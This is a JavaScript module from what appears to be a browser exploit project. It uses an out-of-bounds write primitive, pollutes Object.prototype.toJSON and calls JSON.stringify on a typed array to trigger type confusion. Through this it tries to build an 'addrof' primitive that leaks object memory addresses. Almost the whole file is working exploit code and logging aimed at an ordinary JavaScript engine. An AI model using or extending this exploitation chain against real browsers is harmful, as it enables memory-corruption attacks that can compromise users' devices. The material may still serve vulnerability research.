// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v14_SimplifiedLogging)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V14_SL = "OriginalHeisenbug_TypedArrayAddrof_v14_SimplifiedLogging";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let probe_calls_details_array_v14 = []; 
let object_to_leak_A_v14 = null;
let object_to_leak_B_v14 = null;
let victim_typed_array_ref_v14 = null;
let probe_call_count_v14 = 0;

function toJSON_TA_Probe_SimplifiedLogging() {
    probe_call_count_v14++;
    let current_call_details = {
        call_number: probe_call_count_v14,
        probe_variant: "TA_Probe_Addrof_v14_SimplifiedLogging",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        this_is_victim_ref: false,
        this_is_prev_probe_return_marker: false, // Check if 'this' is a marker object we returned
        writes_attempted_on_this: false,
        this_keys_after_write: null
    };

    try {
        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
        current_call_details.this_is_victim_ref = (this === victim_typed_array_ref_v14);
        
        if (typeof this === 'object' && this !== null && this.hasOwnProperty('probe_source_call')) {
            current_call_details.this_is_prev_probe_return_marker = true;
            current_call_details.prev_probe_call_marker = this.probe_source_call;
        }

        logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}. 'this' type: ${current_call_details.this_type_in_toJSON}. IsVictim? ${current_call_details.this_is_victim_ref}. IsPrevReturnMarker? ${current_call_details.this_is_prev_probe_return_marker}${current_call_details.this_is_prev_probe_return_marker ? " (from call #" + current_call_details.prev_probe_call_marker + ")" : ""}`, "leak");

        if (current_call_details.this_type_in_toJSON === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: TYPE CONFUSION DETECTED for 'this'!`, "vuln");
            
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Attempting addrof writes on this confused 'this'...`, "warn");
            if (object_to_leak_A_v14) this[0] = object_to_leak_A_v14;
            if (object_to_leak_B_v14) this[1] = object_to_leak_B_v14;
            current_call_details.writes_attempted_on_this = true;
            current_call_details.this_keys_after_write = Object.keys(this); // Capture keys AFTER potential modification
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Writes to confused 'this' attempted. 'this' keys now: ${current_call_details.this_keys_after_write.join(',')}`, "info");

        } else if (current_call_details.this_is_victim_ref) {
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: 'this' is victim, type is ${current_call_details.this_type_in_toJSON}.`, "info");
        }
    } catch (e) {
        current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
    }
    
    probe_calls_details_array_v14.push(current_call_details); // Add a direct reference, not a copy for now
    return { "probe_source_call": current_call_details.call_number }; 
}

export async function executeTypedArrayVictimAddrofTest_SimplifiedLogging() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V14_SL}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, SimplifiedLogging) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V14_SL} Init...`;

    probe_calls_details_array_v14 = []; 
    probe_call_count_v14 = 0;         
    victim_typed_array_ref_v14 = null; 
    object_to_leak_A_v14 = { marker: "ObjA_TA_v14sl", id: Date.now() }; 
    object_to_leak_B_v14 = { marker: "ObjB_TA_v14sl", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null; 
    let last_actual_probe_details = null; 
    
    let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A: Default" };
    let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B: Default" };
    const fillPattern = 0.14141414141414;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        logS3("OOB Environment initialized.", "info", FNAME_CURRENT_TEST);
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v14 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v14.buffer); 
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) float64_view_on_underlying_ab[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v14 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_SimplifiedLogging, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} polluted.`, "info", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v14); 
            logS3(`  JSON.stringify completed. Stringify Output (first 100 chars): ${stringifyOutput ? stringifyOutput.substring(0,100) + "..." : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            if (probe_calls_details_array_v14.length > 0) {
                last_actual_probe_details = probe_calls_details_array_v14[probe_calls_details_array_v14.length - 1];
            }
            logS3(`  LOGGING FROM execute... : Last probe call details (directly from array): ${last_actual_probe_details ? JSON.stringify(last_actual_probe_details) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmed = false;
            if (last_actual_probe_details && last_actual_probe_details.this_type_in_toJSON === "[object Object]") {
                heisenbugConfirmed = true;
                logS3(`  HEISENBUG ON 'this' OF PROBE CONFIRMED (from last_actual_probe_details)! 'this' type: ${last_actual_probe_details.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
                logS3(`    Details from that call: ${JSON.stringify(last_actual_probe_details)}`, "info");
            } else {
                logS3(`  ALERT: Heisenbug NOT confirmed by last_actual_probe_details. Last type: ${last_actual_probe_details ? last_actual_probe_details.this_type_in_toJSON : 'N/A'}`, "error", FNAME_CURRENT_TEST);
            }
                
            logS3("STEP 3: Checking victim buffer...", "warn", FNAME_CURRENT_TEST);
            const val_A = float64_view_on_underlying_ab[0];
            addrof_result_A.leaked_address_as_double = val_A;
            let temp_A = new ArrayBuffer(8); new Float64Array(temp_A)[0] = val_A;
            addrof_result_A.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_A)[0], new Uint32Array(temp_A)[1]);
            if (val_A !== (fillPattern + 0) && val_A !== 0 && (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_result_A.success = true;
                addrof_result_A.message = "Possible pointer for ObjA.";
            } else {
                addrof_result_A.message = `No pointer for ObjA. ${heisenbugConfirmed ? "TC obs, " : ""}Buffer unchanged.`;
            }

            const val_B = float64_view_on_underlying_ab[1];
            // ... (similar for B)
            addrof_result_B.leaked_address_as_double = val_B;
            let temp_B = new ArrayBuffer(8); new Float64Array(temp_B)[0] = val_B;
            addrof_result_B.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_B)[0], new Uint32Array(temp_B)[1]);
            if (val_B !== (fillPattern + 1) && val_B !== 0 && (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_result_B.success = true;
                addrof_result_B.message = "Possible pointer for ObjB.";
            } else {
                addrof_result_B.message = `No pointer for ObjB. ${heisenbugConfirmed ? "TC obs, " : ""}Buffer unchanged.`;
            }


            if (addrof_result_A.success || addrof_result_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V14_SL}: Addr? SUCESSO!`;
            } else if (heisenbugConfirmed) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V14_SL}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V14_SL}: Heisenbug Fail?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V14_SL}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V14_SL} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v14}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_result_A.success}, Msg='${addrof_result_A.message}'`, addrof_result_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_result_B.success}, Msg='${addrof_result_B.message}'`, addrof_result_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v14 = null; 
        probe_calls_details_array_v14 = []; 
        probe_call_count_v14 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput, 
        toJSON_details: last_actual_probe_details, 
        all_probe_calls_details_v14: [...probe_calls_details_array_v14], // Return a copy for safety
        total_probe_calls_v14: probe_call_count_v14, // This will be 0 here due to reset, take from result.total_probe_calls_v14
        addrof_A_attempt_result: addrof_result_A,
        addrof_B_attempt_result: addrof_result_B
    };
}
